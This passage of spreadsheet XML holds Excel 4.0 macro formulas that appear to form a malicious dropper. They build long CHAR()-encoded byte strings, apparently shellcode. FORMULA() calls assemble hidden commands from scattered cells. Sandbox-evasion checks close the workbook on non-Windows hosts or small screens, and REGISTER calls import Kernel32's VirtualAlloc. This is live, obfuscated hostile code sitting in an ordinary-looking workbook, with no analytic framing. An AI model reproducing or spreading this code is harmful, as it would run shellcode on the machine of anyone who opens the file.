&amp;CHAR(37)&amp;CHAR(141)&amp;CHAR(248)&amp;CHAR(220)&amp;CHAR(50)&amp;CHAR(235)&amp;CHAR(13)&amp;CHAR(51)&amp;CHAR(214)&amp;CHAR(45)&amp;CHAR(237)&amp;CHAR(37)&amp;CHAR(255)&amp;CHAR(62)&amp;CHAR(110)&amp;CHAR(40)&amp;CHAR(170)&amp;CHAR(161)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(84)&amp;CHAR(37)&amp;CHAR(30)&amp;CHAR(177)&amp;CHAR(16)&amp;CHAR(221)&amp;CHAR(167)&amp;CHAR(184)&amp;CHAR(38)&amp;CHAR(94)&amp;CHAR(147)&amp;CHAR(162)&amp;CHAR(82)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(220)&amp;CHAR(98)&amp;CHAR(90)&amp;CHAR(231)&amp;CHAR(23)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(47)&amp;CHAR(204)&amp;CHAR(144)&amp;CHAR(104)&amp;CHAR(6)&amp;CHAR(171)&amp;CHAR(31)&amp;CHAR(240)&amp;CHAR(145)&amp;CHAR(15)&amp;CHAR(113)&amp;CHAR(29)&amp;CHAR(119)&amp;CHAR(206)&amp;CHAR(1)&amp;CHAR(239)&amp;CHAR(106)&amp;CHAR(4)&amp;CHAR(101)&amp;CHAR(20)&amp;CHAR(81)&amp;CHAR(3)&amp;CHAR(113)&amp;CHAR(20)&amp;CHAR(179)&amp;CHAR(126)&amp;CHAR(249)&amp;CHAR(181)&amp;CHAR(135)&amp;CHAR(249)&amp;CHAR(193)&amp;CHAR(10)&amp;CHAR(195)&amp;CHAR(210)&amp;CHAR(42)&amp;CHAR(230)&amp;CHAR(178)&amp;CHAR(202)&amp;CHAR(42)&amp;CHAR(16)&amp;CHAR(142)&amp;CHAR(205)&amp;CHAR(192)&amp;CHAR(59)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(153)&amp;CHAR(15)&amp;CHAR(102)&amp;CHAR(155)&amp;CHAR(127)&amp;CHAR(118)&amp;CHAR(79)&amp;CHAR(90)&amp;CHAR(149)&amp;CHAR(98)&amp;CHAR(170)&amp;CHAR(213)&amp;CHAR(165)&amp;CHAR(222)&amp;CHAR(41)&amp;CHAR(37)&amp;CHAR(130)&amp;CHAR(163)&amp;CHAR(128)&amp;CHAR(169)&amp;CHAR(168)&amp;CHAR(201)&amp;CHAR(41)&amp;CHAR(35)&amp;CHAR(35)&amp;CHAR(151)&amp;CHAR(139)&amp;CHAR(48)&amp;CHAR(225)&amp;CHAR(62)&amp;CHAR(144)&amp;CHAR(191)&amp;CHAR(3)&amp;CHAR(152)&amp;CHAR(222)&amp;CHAR(129)&amp;CHAR(71)&amp;CHAR(225)&amp;CHAR(40)&amp;CHAR(203)&amp;CHAR(215)&amp;CHAR(36)&amp;CHAR(168)&amp;CHAR(247)&amp;CHAR(91)&amp;CHAR(33)&amp;CHAR(242)&amp;CHAR(173)&amp;CHAR(153)&amp;CHAR(180)&amp;CHAR(100)&amp;CHAR(240)&amp;CHAR(211)&amp;CHAR(158)&amp;CHAR(177)&amp;CHAR(237)&amp;CHAR(254)&amp;CHAR(234)&amp;CHAR(36)&amp;CHAR(151)&amp;CHAR(11)&amp;CHAR(101)&amp;CHAR(238)&amp;CHAR(176)&amp;CHAR(144)&amp;CHAR(125)&amp;CHAR(135)&amp;CHAR(27)&amp;CHAR(26)&amp;CHAR(255)&amp;CHAR(150)&amp;CHAR(198)&amp;CHAR(45)&amp;CHAR(89)&amp;CHAR(63)&amp;CHAR(191)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(138)&amp;CHAR(77)&amp;CHAR(215)&amp;CHAR(135)&amp;CHAR(251)&amp;CHAR(182)&amp;CHAR(231)&amp;CHAR(183)&amp;CHAR(102)&amp;CHAR(189)&amp;CHAR(135)&amp;CHAR(176)&amp;CHAR(101)&amp;CHAR(18)&amp;CHAR(188)&amp;CHAR(69)&amp;CHAR(218)&amp;CHAR(87)&amp;CHAR(44)&amp;CHAR(130)&amp;CHAR(21)</f>
        <v>lëìÏ_x000E__x0007_õn­•[ù%íöOt8tŽ……_x0019_¬°&amp;×6ôÃiŠW]7¨þ¦G5ªËÀ$“6(±ná™_x0003_À­._x001A_2þ€›6éÉuE%øÜ2ë_x000D_3Ö-í%ÿ&gt;n(ª¡DŠT%_x001E_±_x0010_Ý§¸&amp;^“¢RªRÜbZç_x0017_'_x0001_ý†/Ìh_x0006_«_x001F_ð‘_x000F_q_x001D_wÎ_x0001_ïj_x0004_e_x0014_Q_x0003_q_x0014_³~ùµ‡ùÁ
ÃÒ*æ²Ê*_x0010_ŽÍÀ;(*™_x000F_f›vOZ•bªÕ¥Þ)%‚£€©¨É)##—‹0á&gt;¿_x0003_˜ÞGá(Ë×$¨÷[!ò­™´dðÓž±íþê$—_x000B_eî°}‡_x001B__x001A_ÿ–Æ-Y?¿ˆwŠM×‡û¶ç·f½‡°e_x0012_¼EÚW,‚_x0015_</v>
      </c>
      <c r="DG4" t="str">
        <f>CHAR(39)&amp;CHAR(72)&amp;CHAR(45)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(226)&amp;CHAR(244)&amp;CHAR(159)</f>
        <v>'H-øÿÿÿâôŸ</v>
      </c>
      <c r="DH4" t="s">
        <v>3</v>
      </c>
      <c r="DJ4">
        <f>IF(GET.WORKSPACE(14)&lt;381,CLOSE(TRUE),)</f>
        <v>0</v>
      </c>
    </row>
    <row r="5" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE5" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH35&amp;DH45&amp;DH40&amp;DH47&amp;DH39&amp;DH28&amp;DH31&amp;DH44&amp;DH66&amp;DH45&amp;DH31&amp;DH27&amp;DH44&amp;DH29&amp;DH34&amp;DH66&amp;DH68&amp;DH49&amp;DH9&amp;DH14&amp;DH4&amp;DH15&amp;DH23&amp;DH19&amp;DH68&amp;DH76&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH54&amp;DH67&amp;DH67&amp;DH67&amp;DH76&amp;DH76&amp;DH29&amp;DH38&amp;DH41&amp;DH45&amp;DH31&amp;DH66&amp;DH46&amp;DH44&amp;DH47&amp;DH31&amp;DH67&amp;DH67,DJ5)</f>
        <v>1</v>
      </c>
      <c r="DF5" t="str">
        <f>CHAR(63)&amp;CHAR(43)&amp;CHAR(61)&amp;CHAR(234)&amp;CHAR(124)&amp;CHAR(183)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(8)&amp;CHAR(223)&amp;CHAR(172)&amp;CHAR(212)&amp;CHAR(201)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(225)&amp;CHAR(196)&amp;CHAR(141)&amp;CHAR(133)&amp;CHAR(86)&amp;CHAR(24)&amp;CHAR(232)&amp;CHAR(81)&amp;CHAR(95)&amp;CHAR(216)&amp;CHAR(219)&amp;CHAR(22)&amp;CHAR(45)&amp;CHAR(32)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(118)&amp;CHAR(8)&amp;CHAR(153)&amp;CHAR(36)&amp;CHAR(59)&amp;CHAR(63)&amp;CHAR(66)&amp;CHAR(198)&amp;CHAR(250)&amp;CHAR(103)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(57)&amp;CHAR(160)&amp;CHAR(87)&amp;CHAR(101)&amp;CHAR(166)&amp;CHAR(22)&amp;CHAR(126)&amp;CHAR(157)&amp;CHAR(86)&amp;CHAR(242)&amp;CHAR(43)&amp;CHAR(155)&amp;CHAR(147)&amp;CHAR(205)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(80)&amp;CHAR(93)&amp;CHAR(237)&amp;CHAR(15)&amp;CHAR(161)&amp;CHAR(102)&amp;CHAR(211)&amp;CHAR(197)&amp;CHAR(30)&amp;CHAR(47)&amp;CHAR(88)&amp;CHAR(238)&amp;CHAR(239)&amp;CHAR(59)&amp;CHAR(27)&amp;CHAR(231)&amp;CHAR(129)&amp;CHAR(55)&amp;CHAR(179)&amp;CHAR(97)&amp;CHAR(108)&amp;CHAR(118)&amp;CHAR(62)&amp;CHAR(120)&amp;CHAR(202)&amp;CHAR(248)&amp;CHAR(21)&amp;CHAR(119)&amp;CHAR(100)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(246)&amp;CHAR(116)&amp;CHAR(237)&amp;CHAR(24)&amp;CHAR(97)&amp;CHAR(194)&amp;CHAR(158)&amp;CHAR(18)&amp;CHAR(26)&amp;CHAR(144)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(165)&amp;CHAR(154)&amp;CHAR(152)&amp;CHAR(55)&amp;CHAR(178)&amp;CHAR(169)&amp;CHAR(97)&amp;CHAR(4)&amp;CHAR(146)&amp;CHAR(226)&amp;CHAR(215)&amp;CHAR(128)&amp;CHAR(116)&amp;CHAR(1)&amp;CHAR(231)&amp;CHAR(22)&amp;CHAR(129)&amp;CHAR(234)&amp;CHAR(80)&amp;CHAR(102)&amp;CHAR(171)&amp;CHAR(81)&amp;CHAR(112)&amp;CHAR(174)&amp;CHAR(251)&amp;CHAR(180)&amp;CHAR(218)&amp;CHAR(159)&amp;CHAR(172)&amp;CHAR(159)&amp;CHAR(115)&amp;CHAR(169)&amp;CHAR(80)&amp;CHAR(240)&amp;CHAR(45)&amp;CHAR(229)&amp;CHAR(6)&amp;CHAR(133)&amp;CHAR(11)&amp;CHAR(217)&amp;CHAR(22)&amp;CHAR(208)&amp;CHAR(54)&amp;CHAR(120)&amp;CHAR(213)&amp;CHAR(102)&amp;CHAR(229)&amp;CHAR(94)&amp;CHAR(184)&amp;CHAR(96)&amp;CHAR(216)&amp;CHAR(205)&amp;CHAR(81)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(27)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(146)&amp;CHAR(147)&amp;CHAR(89)&amp;CHAR(177)&amp;CHAR(167)&amp;CHAR(79)&amp;CHAR(222)&amp;CHAR(136)&amp;CHAR(81)&amp;CHAR(33)&amp;CHAR(109)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(18)&amp;CHAR(49)&amp;CHAR(182)&amp;CHAR(147)&amp;CHAR(79)&amp;CHAR(69)&amp;CHAR(239)&amp;CHAR(77)&amp;CHAR(168)&amp;CHAR(161)&amp;CHAR(247)&amp;CHAR(2)&amp;CHAR(158)&amp;CHAR(188)&amp;CHAR(16)&amp;CHAR(68)&amp;CHAR(131)&amp;CHAR(6)&amp;CHAR(218)&amp;CHAR(194)&amp;CHAR(103)&amp;CHAR(50)&amp;CHAR(176)&amp;CHAR(19)&amp;CHAR(67)&amp;CHAR(50)&amp;CHAR(180)&amp;CHAR(234)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(58)&amp;CHAR(119)&amp;CHAR(122)&amp;CHAR(146)&amp;CHAR(170)&amp;CHAR(127)&amp;CHAR(245)&amp;CHAR(152)&amp;CHAR(235)&amp;CHAR(79)&amp;CHAR(239)&amp;CHAR(152)&amp;CHAR(101)&amp;CHAR(248)&amp;CHAR(83)&amp;CHAR(155)&amp;CHAR(34)&amp;CHAR(214)&amp;CHAR(147)&amp;CHAR(92)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(97)&amp;CHAR(39)&amp;CHAR(123)&amp;CHAR(133)&amp;CHAR(38)&amp;CHAR(95)&amp;CHAR(100)&amp;CHAR(80)&amp;CHAR(237)&amp;CHAR(109)&amp;CHAR(42)&amp;CHAR(244)&amp;CHAR(150)&amp;CHAR(217)&amp;CHAR(113)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(167)&amp;CHAR(68)&amp;CHAR(137)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(230)&amp;CHAR(226)&amp;CHAR(157)</f>
        <v>?+=ê|·&amp;_x0013__x0008_ß¬ÔÉ£âáÄ…V_x0018_èQ_ØÛ_x0016_- ‹Ãv_x0008_™$;?BÆúgU†9 We¦_x0016_~Vò+›“ÍòbP]í_x000F_¡fÓÅ_x001E_/Xîï;_x001B_ç7³alv&gt;xÊø_x0015_wdCóötí_x0018_aÂž_x0012__x001A_-_x0015_¥š˜7²©a_x0004_’â×€t_x0001_ç_x0016_êPf«Qp®û´ÚŸ¬Ÿs©Pð-å_x0006_…_x000B_Ù_x0016_Ð6xÕfå^¸`ØÍQ1Í_x001B__x000F__x0011_’“Y±§OÞˆQ!mô6_x0012_1¶“OEïM¨¡÷_x0002_ž¼_x0010_Dƒ_x0006_ÚÂg2°_x0013_C2´ê_x0002_‰M‡:wz’ªõ˜ëOï˜eøS›"Ö“\]R…`a'{…&amp;_dPím*ô–Ùq‹Ã§D‰vc¼æâ</v>
      </c>
      <c r="DG5" t="str">
        <f>CHAR(84)&amp;CHAR(106)&amp;CHAR(66)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(187)&amp;CHAR(191)&amp;CHAR(212)&amp;CHAR(134)</f>
        <v>TjB|Ÿ_x001D_»¿Ô†</v>
      </c>
      <c r="DH5" t="s">
        <v>4</v>
      </c>
      <c r="DJ5">
        <f>IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,CLOSE(TRUE))</f>
        <v>0</v>
      </c>
    </row>
    <row r="6" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE6" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH37&amp;DH5&amp;DH18&amp;DH14&amp;DH5&amp;DH12&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH68&amp;DH48&amp;DH9&amp;DH18&amp;DH20&amp;DH21&amp;DH1&amp;DH12&amp;DH27&amp;DH12&amp;DH12&amp;DH15&amp;DH3&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH48&amp;DH1&amp;DH12&amp;DH12&amp;DH15&amp;DH3&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ6)</f>
        <v>1</v>
      </c>
      <c r="DF6" t="str">
        <f>CHAR(206)&amp;CHAR(13)&amp;CHAR(38)&amp;CHAR(81)&amp;CHAR(140)&amp;CHAR(177)&amp;CHAR(172)&amp;CHAR(238)&amp;CHAR(156)&amp;CHAR(225)&amp;CHAR(37)&amp;CHAR(249)&amp;CHAR(189)&amp;CHAR(142)&amp;CHAR(117)&amp;CHAR(5)&amp;CHAR(44)&amp;CHAR(5)&amp;CHAR(31)&amp;CHAR(31)&amp;CHAR(243)&amp;CHAR(125)&amp;CHAR(140)&amp;CHAR(94)&amp;CHAR(217)&amp;CHAR(162)&amp;CHAR(43)&amp;CHAR(208)&amp;CHAR(250)&amp;CHAR(199)&amp;CHAR(202)&amp;CHAR(215)&amp;CHAR(44)&amp;CHAR(74)&amp;CHAR(115)&amp;CHAR(156)&amp;CHAR(26)&amp;CHAR(69)&amp;CHAR(133)&amp;CHAR(112)&amp;CHAR(183)&amp;CHAR(57)&amp;CHAR(40)&amp;CHAR(210)&amp;CHAR(1)&amp;CHAR(121)&amp;CHAR(252)&amp;CHAR(166)&amp;CHAR(25)&amp;CHAR(19)&amp;CHAR(203)&amp;CHAR(35)&amp;CHAR(171)&amp;CHAR(117)&amp;CHAR(189)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(87)&amp;CHAR(209)&amp;CHAR(63)&amp;CHAR(110)&amp;CHAR(163)&amp;CHAR(61)&amp;CHAR(83)&amp;CHAR(249)&amp;CHAR(185)&amp;CHAR(27)&amp;CHAR(36)&amp;CHAR(48)&amp;CHAR(254)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(222)&amp;CHAR(106)&amp;CHAR(211)&amp;CHAR(56)&amp;CHAR(5)&amp;CHAR(154)&amp;CHAR(242)&amp;CHAR(30)&amp;CHAR(209)&amp;CHAR(91)&amp;CHAR(76)&amp;CHAR(164)&amp;CHAR(64)&amp;CHAR(206)&amp;CHAR(133)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(172)&amp;CHAR(6)&amp;CHAR(211)&amp;CHAR(152)&amp;CHAR(4)&amp;CHAR(248)&amp;CHAR(43)&amp;CHAR(4)&amp;CHAR(151)&amp;CHAR(160)&amp;CHAR(104)&amp;CHAR(149)&amp;CHAR(213)&amp;CHAR(208)&amp;CHAR(127)&amp;CHAR(23)&amp;CHAR(41)&amp;CHAR(190)&amp;CHAR(174)&amp;CHAR(227)&amp;CHAR(18)&amp;CHAR(11)&amp;CHAR(137)&amp;CHAR(169)&amp;CHAR(84)&amp;CHAR(213)&amp;CHAR(144)&amp;CHAR(122)&amp;CHAR(88)&amp;CHAR(185)&amp;CHAR(26)&amp;CHAR(169)&amp;CHAR(217)&amp;CHAR(110)&amp;CHAR(155)&amp;CHAR(217)&amp;CHAR(212)&amp;CHAR(161)&amp;CHAR(163)&amp;CHAR(59)&amp;CHAR(207)&amp;CHAR(86)&amp;CHAR(149)&amp;CHAR(238)&amp;CHAR(229)&amp;CHAR(60)&amp;CHAR(240)&amp;CHAR(141)&amp;CHAR(124)&amp;CHAR(185)&amp;CHAR(145)&amp;CHAR(30)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(72)&amp;CHAR(161)&amp;CHAR(113)&amp;CHAR(247)&amp;CHAR(157)&amp;CHAR(108)&amp;CHAR(55)&amp;CHAR(174)&amp;CHAR(136)&amp;CHAR(126)&amp;CHAR(229)&amp;CHAR(14)&amp;CHAR(214)&amp;CHAR(199)&amp;CHAR(128)&amp;CHAR(173)&amp;CHAR(17)&amp;CHAR(20)&amp;CHAR(196)&amp;CHAR(135)&amp;CHAR(236)&amp;CHAR(125)&amp;CHAR(9)&amp;CHAR(150)&amp;CHAR(220)&amp;CHAR(20)&amp;CHAR(128)&amp;CHAR(24)&amp;CHAR(123)&amp;CHAR(141)&amp;CHAR(42)&amp;CHAR(172)&amp;CHAR(53)&amp;CHAR(217)&amp;CHAR(47)&amp;CHAR(166)&amp;CHAR(35)&amp;CHAR(140)&amp;CHAR(146)&amp;CHAR(4)&amp;CHAR(89)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(214)&amp;CHAR(26)&amp;CHAR(80)&amp;CHAR(19)&amp;CHAR(62)&amp;CHAR(8)&amp;CHAR(9)&amp;CHAR(102)&amp;CHAR(74)&amp;CHAR(58)&amp;CHAR(7)&amp;CHAR(85)&amp;CHAR(47)&amp;CHAR(238)&amp;CHAR(85)&amp;CHAR(243)&amp;CHAR(185)&amp;CHAR(76)&amp;CHAR(112)&amp;CHAR(53)&amp;CHAR(255)&amp;CHAR(167)&amp;CHAR(62)&amp;CHAR(204)&amp;CHAR(210)&amp;CHAR(69)&amp;CHAR(45)&amp;CHAR(44)&amp;CHAR(225)&amp;CHAR(53)&amp;CHAR(140)&amp;CHAR(238)&amp;CHAR(89)&amp;CHAR(96)&amp;CHAR(32)&amp;CHAR(222)&amp;CHAR(191)&amp;CHAR(212)&amp;CHAR(37)&amp;CHAR(240)&amp;CHAR(189)&amp;CHAR(246)&amp;CHAR(212)&amp;CHAR(11)&amp;CHAR(171)&amp;CHAR(86)&amp;CHAR(21)&amp;CHAR(49)&amp;CHAR(134)&amp;CHAR(239)&amp;CHAR(121)&amp;CHAR(111)&amp;CHAR(149)&amp;CHAR(133)&amp;CHAR(51)&amp;CHAR(219)&amp;CHAR(192)&amp;CHAR(77)&amp;CHAR(43)&amp;CHAR(155)&amp;CHAR(162)&amp;CHAR(200)&amp;CHAR(236)&amp;CHAR(231)&amp;CHAR(97)&amp;CHAR(168)&amp;CHAR(64)&amp;CHAR(115)&amp;CHAR(35)</f>
        <v>Î_x000D_&amp;QŒ±¬îœá%ù½Žu_x0005_,_x0005__x001F__x001F_ó}Œ^Ù¢+ÐúÇÊ×,Jsœ_x001A_E…p·9(Ò_x0001_yü¦_x0019__x0013_Ë#«u½_x000F_
WÑ?n£=Sù¹_x001B_$0þ³DÞjÓ8_x0005_šò_x001E_Ñ[L¤@Î…_x0001_‰¬_x0006_Ó˜_x0004_ø+_x0004_— h•ÕÐ_x0017_)¾®ã_x0012__x000B_‰©TÕzX¹_x001A_©Ùn›ÙÔ¡£;ÏV•îå&lt;ð|¹‘_x001E_‹MH¡q÷l7®ˆ~å_x000E_ÖÇ€­_x0011__x0014_Ä‡ì}	–Ü_x0014_€_x0018_{*¬5Ù/¦#Œ’_x0004_Y/_x0011_Ö_x001A_P_x0013_&gt;_x0008_	fJ:_x0007_U/îUó¹Lp5ÿ§&gt;ÌÒE-,á5ŒîY` Þ¿Ô%ð½öÔ_x000B_«V_x0015_1†ïyo•…3ÛÀM+›¢Èìça¨@s#</v>
      </c>
      <c r="DG6" t="str">
        <f>CHAR(202)&amp;CHAR(191)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(190)&amp;CHAR(191)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)</f>
        <v>Ê¿×œ¾¿Ô†Ê4</v>
      </c>
      <c r="DH6" t="s">
        <v>5</v>
      </c>
      <c r="DJ6">
        <f>REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)</f>
        <v>-647561216</v>
      </c>
    </row>
    <row r="7" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE7" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH37&amp;DH5&amp;DH18&amp;DH14&amp;DH5&amp;DH12&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH68&amp;DH49&amp;DH18&amp;DH9&amp;DH20&amp;DH5&amp;DH42&amp;DH18&amp;DH15&amp;DH3&amp;DH5&amp;DH19&amp;DH19&amp;DH39&amp;DH5&amp;DH13&amp;DH15&amp;DH18&amp;DH25&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH36&amp;DH36&amp;DH29&amp;DH36&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH49&amp;DH42&amp;DH18&amp;DH15&amp;DH3&amp;DH5&amp;DH19&amp;DH19&amp;DH39&amp;DH5&amp;DH13&amp;DH15&amp;DH18&amp;DH25&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ7)</f>
        <v>1</v>
      </c>
      <c r="DF7" t="str">
        <f>CHAR(22)&amp;CHAR(156)&amp;CHAR(74)&amp;CHAR(57)&amp;CHAR(145)&amp;CHAR(176)&amp;CHAR(7)&amp;CHAR(189)&amp;CHAR(175)&amp;CHAR(198)&amp;CHAR(117)&amp;CHAR(175)&amp;CHAR(131)&amp;CHAR(185)&amp;CHAR(151)&amp;CHAR(70)&amp;CHAR(93)&amp;CHAR(109)&amp;CHAR(218)&amp;CHAR(170)&amp;CHAR(140)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(236)&amp;CHAR(57)&amp;CHAR(11)&amp;CHAR(245)&amp;CHAR(240)&amp;CHAR(80)&amp;CHAR(232)&amp;CHAR(120)&amp;CHAR(65)&amp;CHAR(168)&amp;CHAR(255)&amp;CHAR(77)&amp;CHAR(204)&amp;CHAR(57)&amp;CHAR(240)&amp;CHAR(69)&amp;CHAR(156)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(239)&amp;CHAR(250)&amp;CHAR(77)&amp;CHAR(165)&amp;CHAR(188)&amp;CHAR(234)&amp;CHAR(156)&amp;CHAR(154)&amp;CHAR(111)&amp;CHAR(201)&amp;CHAR(26)&amp;CHAR(223)&amp;CHAR(210)&amp;CHAR(187)&amp;CHAR(35)&amp;CHAR(205)&amp;CHAR(215)&amp;CHAR(51)&amp;CHAR(208)&amp;CHAR(177)&amp;CHAR(26)&amp;CHAR(202)&amp;CHAR(247)&amp;CHAR(146)&amp;CHAR(53)&amp;CHAR(236)&amp;CHAR(9)&amp;CHAR(53)&amp;CHAR(228)&amp;CHAR(210)&amp;CHAR(140)&amp;CHAR(150)&amp;CHAR(17)&amp;CHAR(8)&amp;CHAR(234)&amp;CHAR(50)&amp;CHAR(79)&amp;CHAR(233)&amp;CHAR(39)&amp;CHAR(126)&amp;CHAR(218)&amp;CHAR(35)&amp;CHAR(38)&amp;CHAR(245)&amp;CHAR(186)&amp;CHAR(52)&amp;CHAR(89)&amp;CHAR(44)&amp;CHAR(122)&amp;CHAR(111)&amp;CHAR(84)&amp;CHAR(8)&amp;CHAR(93)&amp;CHAR(215)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(236)&amp;CHAR(119)&amp;CHAR(219)&amp;CHAR(189)&amp;CHAR(224)&amp;CHAR(2)&amp;CHAR(152)&amp;CHAR(15)&amp;CHAR(170)&amp;CHAR(68)&amp;CHAR(65)&amp;CHAR(219)&amp;CHAR(23)&amp;CHAR(77)&amp;CHAR(72)&amp;CHAR(241)&amp;CHAR(63)&amp;CHAR(238)&amp;CHAR(214)&amp;CHAR(164)&amp;CHAR(145)&amp;CHAR(24)&amp;CHAR(155)&amp;CHAR(72)&amp;CHAR(139)&amp;CHAR(49)&amp;CHAR(64)&amp;CHAR(146)&amp;CHAR(195)&amp;CHAR(103)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(217)&amp;CHAR(50)&amp;CHAR(80)&amp;CHAR(219)&amp;CHAR(221)&amp;CHAR(68)&amp;CHAR(1)&amp;CHAR(107)&amp;CHAR(144)&amp;CHAR(15)&amp;CHAR(64)&amp;CHAR(129)&amp;CHAR(160)&amp;CHAR(77)&amp;CHAR(200)&amp;CHAR(128)&amp;CHAR(149)&amp;CHAR(227)&amp;CHAR(209)&amp;CHAR(254)&amp;CHAR(210)&amp;CHAR(6)&amp;CHAR(74)&amp;CHAR(200)&amp;CHAR(234)&amp;CHAR(82)&amp;CHAR(178)&amp;CHAR(105)&amp;CHAR(231)&amp;CHAR(125)&amp;CHAR(66)&amp;CHAR(179)&amp;CHAR(149)&amp;CHAR(244)&amp;CHAR(170)&amp;CHAR(17)&amp;CHAR(65)&amp;CHAR(182)&amp;CHAR(22)&amp;CHAR(210)&amp;CHAR(20)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(135)&amp;CHAR(126)&amp;CHAR(37)&amp;CHAR(62)&amp;CHAR(25)&amp;CHAR(24)&amp;CHAR(157)&amp;CHAR(225)&amp;CHAR(127)&amp;CHAR(214)&amp;CHAR(170)&amp;CHAR(193)&amp;CHAR(51)&amp;CHAR(46)&amp;CHAR(250)&amp;CHAR(128)&amp;CHAR(33)&amp;CHAR(239)&amp;CHAR(148)&amp;CHAR(23)&amp;CHAR(97)&amp;CHAR(183)&amp;CHAR(255)&amp;CHAR(200)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(78)&amp;CHAR(198)&amp;CHAR(247)&amp;CHAR(186)&amp;CHAR(54)&amp;CHAR(169)&amp;CHAR(145)&amp;CHAR(107)&amp;CHAR(105)&amp;CHAR(31)&amp;CHAR(235)&amp;CHAR(111)&amp;CHAR(132)&amp;CHAR(25)&amp;CHAR(81)&amp;CHAR(190)&amp;CHAR(148)&amp;CHAR(176)&amp;CHAR(118)&amp;CHAR(42)&amp;CHAR(33)&amp;CHAR(122)&amp;CHAR(209)&amp;CHAR(247)&amp;CHAR(145)&amp;CHAR(150)&amp;CHAR(167)&amp;CHAR(57)&amp;CHAR(181)&amp;CHAR(185)&amp;CHAR(208)&amp;CHAR(116)&amp;CHAR(149)&amp;CHAR(11)&amp;CHAR(58)&amp;CHAR(200)&amp;CHAR(101)&amp;CHAR(219)&amp;CHAR(21)&amp;CHAR(118)&amp;CHAR(1)&amp;CHAR(124)&amp;CHAR(218)&amp;CHAR(12)&amp;CHAR(164)&amp;CHAR(146)&amp;CHAR(204)&amp;CHAR(38)&amp;CHAR(90)&amp;CHAR(118)&amp;CHAR(86)&amp;CHAR(208)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(2)</f>
        <v>_x0016_œJ9‘°_x0007_½¯Æu¯ƒ¹—F]mÚªŒ¥žì9_x000B_õðPèxA¨ÿMÌ9ðEœ_x0006_‰ïúM¥¼êœšoÉ_x001A_ßÒ»#Í×3Ð±_x001A_Ê÷’5ì	5äÒŒ–_x0011__x0008_ê2Oé'~Ú#&amp;õº4Y,zoT_x0008_]×_x0005_
_x000C_ìwÛ½à_x0002_˜_x000F_ªDAÛ_x0017_MHñ?îÖ¤‘_x0018_›H‹1@’Ãg_x001D_¶Ù2PÛÝD_x0001_k_x000F_@ MÈ€•ãÑþÒ_x0006_JÈêR²iç}B³•ôª_x0011_A¶_x0016_Ò_x0014_Ù§‡~%&gt;_x0019__x0018_áÖªÁ3.ú€!ï”_x0017_a·ÿÈY&gt;NÆ÷º6©‘ki_x001F_ëo„_x0019_Q¾”°v*!zÑ÷‘–§9µ¹Ðt•_x000B_:ÈeÛ_x0015_v_x0001_|Ú_x000C_¤’Ì&amp;ZvVÐ_x0005_R_x0002_</v>
      </c>
      <c r="DG7" t="str">
